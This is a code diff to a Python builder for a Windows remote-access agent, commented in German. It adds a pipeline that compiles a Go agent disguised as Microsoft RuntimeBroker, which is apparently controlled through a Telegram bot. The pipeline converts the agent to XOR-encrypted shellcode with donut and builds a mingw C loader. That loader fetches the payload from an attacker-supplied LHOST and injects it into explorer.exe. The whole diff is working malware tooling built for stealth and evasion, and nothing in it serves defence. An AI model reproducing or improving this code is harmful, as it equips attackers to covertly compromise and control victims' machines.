@@ -69,6 +69,9 @@ END
 '''
 
 
+_LOADER_TMPL = Path(__file__).parent / "loader" / "loader.c.tmpl"
+
+
 def is_go_available() -> bool:
     return shutil.which("go") is not None
 
@@ -79,12 +82,85 @@ def _xenc(s: str, key: int) -> str:
 
 
 def _find_windres() -> str | None:
-    """Sucht x86_64-w64-mingw32-windres (mingw) für Windows COFF .syso."""
     for name in ("x86_64-w64-mingw32-windres", "windres"):
         p = shutil.which(name)
         if p:
             return p
     return None
+
+
+def _find_mingw_gcc() -> str | None:
+    for name in ("x86_64-w64-mingw32-gcc", "i686-w64-mingw32-gcc"):
+        p = shutil.which(name)
+        if p:
+            return p
+    return None
+
+
+def _find_donut() -> str | None:
+    """Sucht donut-shellcode Python-Modul."""
+    try:
+        import donut  # noqa: F401
+        return "python3-donut"
+    except ImportError:
+        return None
+
+
+def _make_shellcode(exe_path: str, out_dir: str) -> tuple[str | None, str]:
+    """
+    Konvertiert EXE → Donut-Shellcode → XOR-verschlüsselt → a.bin.
+    Returns (path_to_bin | None, log).
+    """
+    try:
+        import donut
+    except ImportError:
+        return None, "[!] donut nicht installiert (pip3 install donut-shellcode)"
+
+    sc_raw = donut.create(file=exe_path, arch=3)  # arch=3 = amd64
+    if not sc_raw:
+        return None, "[!] donut: Shellcode-Erstellung fehlgeschlagen"
+
+    xk = random.randint(0x21, 0x7E)
+    sc_enc = bytes(b ^ xk for b in sc_raw)
+    out_bin = os.path.join(out_dir, "a.bin")
+    with open(out_bin, "wb") as f:
+        f.write(sc_enc)
+    return out_bin, f"[+] Shellcode: {len(sc_raw):,} bytes → XOR(0x{xk:02X}) → a.bin\n__XK__={xk}"
+
+
+def _build_loader(sc_url: str, xor_key: int, out_dir: str) -> tuple[str | None, str]:
+    """
+    Kompiliert den C-Shellcode-Loader via mingw.
+    Returns (path_to_loader_exe | None, log).
+    """
+    gcc = _find_mingw_gcc()
+    if not gcc:
+        return None, "[!] mingw-gcc nicht gefunden (apt install mingw-w64)"
+
+    tmpl = _LOADER_TMPL.read_text()
+    src  = (tmpl
+            .replace('TMPL_SC_URL',  f'"{sc_url}"')
+            .replace('TMPL_XOR_KEY', str(xor_key)))
+
+    out_loader = os.path.join(out_dir, "loader.exe")
+
+    with tempfile.TemporaryDirectory() as tmp:
+        src_path = Path(tmp, "loader.c")
+        src_path.write_text(src)
+        cmd = [
+            gcc, str(src_path),
+            "-o", out_loader,
+            "-O2", "-s",
+            "-mwindows",          # no console window
+            "-lwininet",
+            "-static-libgcc",
+            "-static-libstdc++",
+        ]
+        r = subprocess.run(cmd, capture_output=True, text=True)
+
+    if os.path.exists(out_loader):
+        return out_loader, r.stderr.strip()
+    return None, r.stderr or "loader-Kompilierung fehlgeschlagen"
 
 
 def generate_source(token: str, chat_id: str, interval: int = 10) -> tuple[str, int]:
@@ -97,7 +173,7 @@ def generate_source(token: str, chat_id: str, interval: int = 10) -> tuple[str, 
         .replace('TMPL_ENC_API',   _xenc("https://api.telegram.org/bot", key))
         .replace('TMPL_ENC_TOKEN', _xenc(token, key))
         .replace('TMPL_ENC_CHAT',  _xenc(chat_id, key))
-        .replace('TMPL_SLEEP',     '3')
+        .replace('TMPL_SLEEP',     '20')
         .replace('TMPL_INTERVAL',  str(interval))
     )
     return src, key
@@ -109,10 +185,15 @@ def build(
     output_dir: str,
     interval: int = 10,
     use_garble: bool = False,
+    lhost: str = "",
+    lport: int = 8888,
 ) -> tuple[str | None, str]:
     """
-    Kompiliert agent.exe mit PE-Metadaten (Microsoft RuntimeBroker).
-    Returns (path_to_exe | None, stderr_log).
+    Vollständige Build-Pipeline:
+      1. Go-Agent EXE (garble + PE-Metadaten)
+      2. Donut → Shellcode → XOR-verschlüsselt (a.bin)
+      3. C-Loader EXE (lädt a.bin in explorer.exe)
+    Returns (path_to_loader_exe | None, log).
     """
     if not is_go_available():
         return None, "Go nicht installiert (apt install golang)"
@@ -125,10 +206,10 @@ def build(
         Path(tmp, "go.mod").write_text(_GOMOD)
         Path(tmp, "main.go").write_text(src)
 
-        # ── PE-Metadaten via windres (Windows COFF .syso) ─────────────────────
+        # ── PE-Metadaten via windres ──────────────────────────────────────────
         windres = _find_windres()
         if windres:
-            rc_path  = Path(tmp, "versioninfo.rc")
+            rc_path   = Path(tmp, "versioninfo.rc")
             syso_path = Path(tmp, "resource.syso")
             rc_path.write_text(_VERSION_RC)
             r_rc = subprocess.run(
@@ -138,29 +219,57 @@ def build(
             if r_rc.returncode != 0 or not syso_path.exists():
                 logs.append(f"[!] windres: {r_rc.stderr.strip()}")
             else:
-                logs.append("[+] PE-Metadaten eingebettet (Microsoft RuntimeBroker)")
+                logs.append("[+] PE-Metadaten: Microsoft RuntimeBroker")
         else:
-            logs.append("[!] windres nicht gefunden — kein PE-Metadaten")
-            logs.append("    (apt install mingw-w64)")
+            logs.append("[!] windres fehlt — kein PE-Metadaten")
 
         env = os.environ.copy()
         env.update({"GOOS": "windows", "GOARCH": "amd64", "CGO_ENABLED": "0"})
 
         garble = shutil.which("garble")
         if use_garble and garble:
-            cmd = [garble, "-seed=random", "-literals", "build",
+            cmd = [garble, "-seed=random", "build",
                    "-ldflags=-s -w -H windowsgui", "-trimpath", "-o", out_exe, "."]
         else:
             cmd = ["go", "build",
                    "-ldflags=-s -w -H windowsgui", "-trimpath", "-o", out_exe, "."]
 
         r = subprocess.run(cmd, capture_output=True, text=True, env=env, cwd=tmp)
-        if r.stderr:
-            logs.append(r.stderr)
+        if r.stderr.strip():
+            err_lines = [l for l in r.stderr.splitlines() if "warning" not in l and l.strip()]
+            if err_lines:
+                logs.extend(err_lines)
 
-    if os.path.exists(out_exe):
-        return out_exe, "\n".join(logs)
-    return None, "\n".join(logs) or "Build fehlgeschlagen (unbekannter Fehler)"
+    if not os.path.exists(out_exe):
+        return None, "\n".join(logs) or "Go-Build fehlgeschlagen"
+    logs.append(f"[+] agent.exe: {os.path.getsize(out_exe):,} bytes")
+
+    # ── Donut: EXE → Shellcode ────────────────────────────────────────────
+    sc_bin, sc_log = _make_shellcode(out_exe, output_dir)
+    if sc_bin:
+        # Extract XOR key from log
+        xk_line = next((l for l in sc_log.splitlines() if "__XK__=" in l), "")
+        sc_xk   = int(xk_line.split("=")[1]) if xk_line else 0x42
+        logs.append(sc_log.split("\n__XK__=")[0])
+
+        # ── C-Loader kompilieren ──────────────────────────────────────────
+        if lhost:
+            sc_url = f"http://{lhost}:{lport}/a.bin"
+        else:
+            sc_url = f"http://LHOST:{lport}/a.bin"
+
+        loader_exe, loader_log = _build_loader(sc_url, sc_xk, output_dir)
+        if loader_exe:
+            logs.append(f"[+] loader.exe: {os.path.getsize(loader_exe):,} bytes — injects into explorer.exe")
+            return loader_exe, "\n".join(logs)
+        else:
+            logs.append(f"[!] Loader-Build: {loader_log}")
+            logs.append("[*] Fallback: agent.exe wird direkt ausgeliefert")
+    else:
+        logs.append(sc_log)
+        logs.append("[*] Fallback: agent.exe wird direkt ausgeliefert")
+
+    return out_exe, "\n".join(logs)
 
 
 async def run(
